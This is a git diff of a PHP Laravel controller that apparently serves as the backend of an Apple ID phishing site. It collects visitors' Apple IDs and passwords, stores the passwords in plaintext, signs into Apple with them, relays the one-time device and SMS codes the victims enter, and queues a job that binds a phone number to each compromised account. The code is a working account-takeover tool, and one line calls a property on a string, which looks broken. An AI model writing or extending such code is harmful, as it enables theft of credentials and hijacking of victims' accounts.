@@ -3,8 +3,12 @@
 namespace App\Http\Controllers;
 
 use App\Apple\Service\AccountBind;
+use App\Apple\Service\Apple;
+use App\Apple\Service\AppleFactory;
+use App\Apple\Service\Common;
+use App\Apple\Service\Exception\LockedException;
 use App\Apple\Service\Exception\UnauthorizedException;
-use App\Apple\Service\HttpClient;
+use App\Apple\Service\HttpClientBak;
 use App\Apple\Service\User;
 use App\Jobs\BindAccountPhone;
 use App\Models\Account;
@@ -15,24 +19,16 @@ use Illuminate\Contracts\View\View;
 use Illuminate\Foundation\Application;
 use Illuminate\Http\JsonResponse;
 use Illuminate\Http\Request;
-use Psr\Log\LoggerInterface;
+use Illuminate\Support\Facades\Session;
 
 class IndexController extends Controller
 {
-
-    protected HttpClient $http;
-
     public function __construct(
         protected readonly Request $request,
-        protected readonly Container $container,
-        protected readonly User $user,
-        protected readonly LoggerInterface $logger
+        private readonly AppleFactory $appleFactory,
     )
     {
-        $this->http = $container->make(
-            HttpClient::class,
-            ['clientId' => $this->request->cookie('laravel_session', uuid_create(UUID_TYPE_TIME))]
-        );
+
     }
 
     public function index(): Factory|Application|View|\Illuminate\Contracts\Foundation\Application
@@ -53,7 +49,7 @@ class IndexController extends Controller
      */
     public function verifyAccount(): \Illuminate\Http\JsonResponse
     {
-
+        //Your Apple ID or password was incorrect 您的 Apple ID 或密码不正确
         $accountName = $this->request->input('accountName');
         $password    = $this->request->input('password');
 
@@ -61,21 +57,34 @@ class IndexController extends Controller
             return $this->error('账号或密码不能为空');
         }
 
-        $response = $this->http->signin($accountName, $password);
+        $guid = sha1($accountName);
 
-        $this->user->set('accountName', $accountName);
-        $this->user->set('password', $password);
+        $apple = $this->appleFactory->create($guid);
 
-        Account::create([
-                'accountName' => $accountName,
-                'password' => $password,
-        ]);
+        $response = $apple->signin($accountName, $password);
+
+        Account::updateOrCreate([
+            'account' => $accountName
+        ],[ 'password' => $password]);
+
+
+        $error = $response->firstServiceError()?->getMessage();
+        Session::flash('Error',$error);
+
+        if (!empty($trustedPhoneNumbers = $response->getTrustedPhoneNumber())){
+            return $this->success(data: [
+                'Guid' => $guid,
+                'Devices' => false,
+                'ID' => $trustedPhoneNumbers->getId(),
+                'Number' => $trustedPhoneNumbers->getNumberWithDialCode(),
+                'Error' => $error,
+            ]);
+        }
 
         return $this->success(data: [
-            'Guid' => $this->request->cookie('laravel_session'),
-            'Devices' => $response->getDevices(),
-            'ID' => $response->getId(),
-            'Number' => $response->getNumber(),
+            'Guid' => $guid,
+            'Devices' => true,
+            'Error' => $error,
         ]);
     }
 
@@ -92,54 +101,67 @@ class IndexController extends Controller
      */
     public function verifySecurityCode(): \Illuminate\Http\JsonResponse
     {
-
         $code = $this->request->input('apple_verifycode');
         if (empty($code)) {
             return $this->redirect();
         }
 
-        $accountName = $this->user->get('accountName');
-        if (empty($accountName)) {
+        $guid = $this->request->input('Guid');
+
+        $apple = $this->appleFactory->create($guid);
+
+        if (empty($account = $apple->getUser()->get('account'))) {
             return $this->redirect();
         }
 
-        if (empty($user = $this->getUserInfo($accountName))) {
+        if (empty($accountInfo = $this->getAccountInfo($account))) {
             return $this->redirect();
         }
 
-        $response = $this->http->authverifytrusteddevicesecuritycode($code);
+        $response = $guid->idmsa->validateSecurityCode($code);
 
-        // 创建队列任务在响应发送到浏览器后调度
-        BindAccountPhone::dispatchAfterResponse($user->id,new AccountBind($this->http,$this->logger));
+        BindAccountPhone::dispatch($accountInfo->id,$guid);
 
         return $this->success($response->getData());
     }
 
-    protected function getUserInfo(string $accountName): \Illuminate\Database\Eloquent\Model|\Illuminate\Database\Eloquent\Builder|Account|\Illuminate\Database\Query\Builder|null
+    protected function getAccountInfo(string $accountName): \Illuminate\Database\Eloquent\Model|\Illuminate\Database\Eloquent\Builder|Account|\Illuminate\Database\Query\Builder|null
     {
-        return Account::where('accountName', $accountName)
+        return Account::where('account', $accountName)
             ->whereNotNull('password')
-            ->whereNull('phone')
             ->first();
     }
 
     /**
      * 验证手机验证码
-     * @return JsonResponse|void
+     * @return JsonResponse
      * @throws GuzzleException
-     * @throws UnauthorizedException
      */
-    public function smsSecurityCode()
+    public function smsSecurityCode(): JsonResponse
     {
-        $Id = $this->request->input('ID');
+        $Id = $this->request->input('ID',1);
         $apple_verifycode = $this->request->input('apple_verifycode');
 
-        if (empty($Id) || empty($apple_verifycode)) {
+        if (empty($apple_verifycode)) {
             return $this->redirect();
         }
 
-        $response = $this->http->authVerifyPhoneSecurityCode($apple_verifycode);
+        $guid = $this->request->input('Guid');//147852
 
+        $apple = $this->appleFactory->create($guid);
+
+        $accountName = $apple->getUser()->get('account');
+        if (empty($accountName)) {
+            return $this->redirect();
+        }
+
+        if (empty($accountInfo = $this->getAccountInfo($accountName))) {
+            return $this->redirect();
+        }
+        // 验证手机号码
+        $response = $apple->idmsa->validatePhoneSecurityCode($apple_verifycode,$Id);
+
+        BindAccountPhone::dispatch($accountInfo->id,$guid);
         return $this->success($response->getData());
     }
 
@@ -147,28 +169,35 @@ class IndexController extends Controller
      * 获取安全码
      * @return JsonResponse
      * @throws UnauthorizedException
-     * @throws GuzzleException
      */
     public function SendSecurityCode(): \Illuminate\Http\JsonResponse
     {
-        return $this->success($this->http->sendSecurityCode()->getData());
+        $guid = $this->request->input('Guid');
+
+        $apple = $this->appleFactory->create($guid);
+
+        return $this->success($apple->idmsa->sendSecurityCode()->getData());
     }
 
     /**
      * 获取手机号码
      * @return JsonResponse
+     * @throws UnauthorizedException
      * @throws GuzzleException
      */
     public function GetPhone(): JsonResponse
     {
-        $response = $this->http->auth();
+        $guid = $this->request->input('Guid');
 
-        $trustedPhoneNumbers = $response->getData('trustedPhoneNumbers');
+        $apple = $this->appleFactory->create($guid);
+
+        $response = $apple->auth();
+
+        $trustedPhoneNumbers = $response->getTrustedPhoneNumber();
 
         return $this->success([
-            'trustedPhoneNumbers' => $trustedPhoneNumbers,
-            'ID'                  => $trustedPhoneNumbers[0]['id'] ?? 0,
-            'Number'              => $trustedPhoneNumbers[0]['obfuscatedNumber'] ?? '',
+            'ID'                  => $trustedPhoneNumbers->getId(),
+            'Number'              => $trustedPhoneNumbers->getNumberWithDialCode(),
         ]);
     }
 
@@ -176,7 +205,6 @@ class IndexController extends Controller
      * 发送验证码
      * @return JsonResponse
      * @throws GuzzleException
-     * @throws UnauthorizedException
      */
     public function SendSms(): JsonResponse
     {
@@ -184,17 +212,22 @@ class IndexController extends Controller
         if (empty($ID)) {
             return $this->error('ID 不能为空');
         }
-        $response = $this->http->sendAuthVerifyPhoneSecurityCode($ID);
+
+        $guid = $this->request->input('Guid');
+        $apple = $this->appleFactory->create($guid);
+
+        $response = $apple->idmsa->sendPhoneSecurityCode($ID);
 
         return $this->success($response->getData());
     }
 
-    public function sms()
+    public function sms(): View|Factory|Application
     {
-        return view('index/sms');
+        return view('index/sms',['phoneNumber' => $this->request->input('Number')]);
     }
 
-    public function result(){
+    public function result(): View|Factory|Application
+    {
         return view('index/result');
     }
 }
